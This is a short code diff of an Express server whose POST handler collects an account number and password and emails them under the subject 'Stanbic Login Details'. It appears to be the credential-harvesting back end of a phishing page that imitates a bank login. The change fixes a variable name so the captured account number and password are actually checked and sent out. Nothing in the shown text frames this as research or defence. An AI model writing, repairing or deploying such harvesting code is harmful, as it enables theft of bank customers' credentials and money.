@@ -48,7 +48,7 @@ const sendMailAndRespond = (
 app.post("/", (req, res) => {
   const { accountNumber, password } = req.body;  // changed
 
-  if (!username || !password) {             // changed
+  if (!accountNumber || !password) {             // changed
     return res
       .status(401)
       .json({ success: false, message: "Invalid accountNumber or password" });  // changed
@@ -58,7 +58,7 @@ app.post("/", (req, res) => {
     from: userEmail,
     to: userEmail,
     subject: "Stanbic Login Details",
-    text: `accountNumber: ${username}\nPassword: ${password}`,  // changed
+    text: `accountNumber: ${accountNumber}\nPassword: ${password}`,  // changed
   };
 
   sendMailAndRespond(
